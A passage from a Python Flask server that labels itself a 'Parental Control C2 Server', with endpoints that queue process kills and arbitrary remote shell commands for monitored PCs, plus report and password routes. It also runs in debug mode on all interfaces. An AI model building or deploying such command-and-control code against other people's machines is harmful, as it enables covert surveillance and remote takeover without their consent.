        return jsonify({'error': 'Unauthorized'}), 403
    
    commands.insert_one({
        'pc_id': pc_id,
        'command': 'kill_process',
        'payload': pid,
        'created_at': time.time()
    })
    return jsonify({'status': 'queued'})

@app.route('/api/remote_shell/<pc_id>', methods=['POST'])
@parent_required
def remote_shell(pc_id):
    """Execute remote shell command"""
    data = request.json
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    commands.insert_one({
        'pc_id': pc_id,
        'command': 'shell_exec',
        'payload': data.get('cmd'),
        'created_at': time.time()
    })
    return jsonify({'status': 'queued'})

@app.route('/api/generate_report_advanced', methods=['POST'])
@parent_required
def generate_report_advanced():
    """Generate activity report (advanced)"""
    data = request.json
    pc_id = data.get('device_id')
    report_type = data.get('report_type', 'daily')
    if pc_id and not pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id}):
        return jsonify({'success': False, 'message': 'PC not found'}), 404
    report_data = {
        'parent_id': current_user.id,
        'pc_id': pc_id,
        'type': report_type,
        'timestamp': time.time(),
        'title': f'{report_type.capitalize()} Report',
        'description': f'Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
    }
    result = reports.insert_one(report_data)
    return jsonify({'success': True, 'report_id': str(result.inserted_id)})

@app.route('/api/view_report/<report_id>')
@parent_required
def view_report(report_id):
    """View generated report"""
    try:
        report = reports.find_one({'_id': ObjectId(report_id), 'parent_id': current_user.id})
        if not report:
            return jsonify({'error': 'Not found'}), 404
        report['_id'] = str(report['_id'])
        return jsonify(report)
    except:
        return jsonify({'error': 'Invalid report ID'}), 400

@app.route('/api/download_report/<report_id>')
@parent_required
def download_report(report_id):
    """Download report as PDF"""
    try:
        report = reports.find_one({'_id': ObjectId(report_id), 'parent_id': current_user.id})
        if not report:
            return jsonify({'error': 'Not found'}), 404
        
        pdf_buffer = BytesIO()
        c = canvas.Canvas(pdf_buffer, pagesize=letter)
        c.drawString(50, 750, f"Report: {report.get('title', 'Report')}")
        c.drawString(50, 730, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        c.showPage()
        c.save()
        
        pdf_buffer.seek(0)
        return send_file(pdf_buffer, mimetype='application/pdf', as_attachment=True, 
                        download_name=f"report_{report_id}.pdf")
    except:
        return jsonify({'error': 'Error generating PDF'}), 500

@app.route('/api/change_password', methods=['POST'])
@parent_required
def change_password():
    """Change parent password"""
    data = request.json
    parent = parents.find_one({'_id': ObjectId(current_user.id)})
    
    if not parent or not check_password_hash(parent['password'], data.get('current_password')):
        return jsonify({'success': False, 'message': 'Incorrect current password'}), 401
    
    new_hash = generate_password_hash(data.get('new_password'))
    parents.update_one({'_id': ObjectId(current_user.id)}, {'$set': {'password': new_hash}})
    
    return jsonify({'success': True, 'message': 'Password changed'})

if __name__ == '__main__':
    print("🚀 Enhanced Parental Control C2 Server Starting...")
    print(f"📊 MongoDB: {MONGODB_URI}")
    print("🌐 Access: http://localhost:5000")
    
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)
